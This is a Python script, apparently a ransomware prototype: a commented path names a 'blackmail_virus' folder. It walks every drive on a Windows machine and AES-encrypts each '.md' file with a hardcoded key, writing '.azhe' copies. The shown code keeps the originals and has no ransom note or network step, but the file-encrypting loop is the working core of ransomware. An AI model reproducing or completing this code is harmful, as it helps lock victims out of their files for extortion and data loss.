#!/usr/bin/python3
# -*- coding: utf-8 -*-

import string
import os
import time
from multiprocessing import Process, Queue
import sys
from Crypto.Cipher import AES
# import queue

'''
AES加密文件
'''


mp3_file_list = Queue()
# 密钥，建议不设这么简单
key = '9420'

def padding(origin_data):
    bs = AES.block_size  # 16
    length = len(origin_data)
    padding_size = bs - length % bs
    padding_data = bytes(chr(padding_size), encoding="ASCII") * padding_size
    return origin_data + padding_data

def unpadding(origin_data):
    padding_size = origin_data[-1]
    return origin_data[:-padding_size]  

def encrypt(key, data):
    key_bytes = key.encode()
    key_bytes = key_bytes + (16 - len(key_bytes)) * b'\0'
    iv = bytes(reversed(key_bytes))
    cipher = AES.new(key_bytes, AES.MODE_CBC, iv)
    # 处理明文
    data_padding = padding(data)
    # 加密
    encrypt_bytes = cipher.encrypt(data_padding)
    return encrypt_bytes  


# 负责遍历文件系统的进程
def fs_traverse(q):
    drive_list = []  # 存放磁盘分区列表

    for c in string.ascii_uppercase:
        drive = c + ":\\"
        if os.path.isdir(drive):
            drive_list.append(drive)

    print(drive_list)

    # drive_list = [r'C:\Users\POWER\Desktop\blackmail_virus\123']

    for drive in drive_list:
        for root, dirs, files in os.walk(drive):
            for f in files:
                # 指定加密文件的后缀名
                if f[-3:].lower() == ".md":
                    dest_file_path = os.path.join(root, f)
                    print(dest_file_path)
                    with open(dest_file_path, "rb") as f:
                        data = encrypt(key, f.read())
                        dst_file_path = dest_file_path + ".azhe"
                    with open(dst_file_path, "wb") as f:
                        f.write(data)

                    q.put(dest_file_path)

    q.put(False)
    print("遍历文件系统的进程已经执行完毕！")




# 父进程负责管理Worker进程
def main():
    start_time = time.time()

    fs_traverse_process = Process(target=fs_traverse, args=(mp3_file_list, ))

    fs_traverse_process.start()

    fs_traverse_process.join()

    end_time = time.time()

    print("耗时%s毫秒！" % int((end_time - start_time) * 1000))


if __name__ == '__main__':
    main()







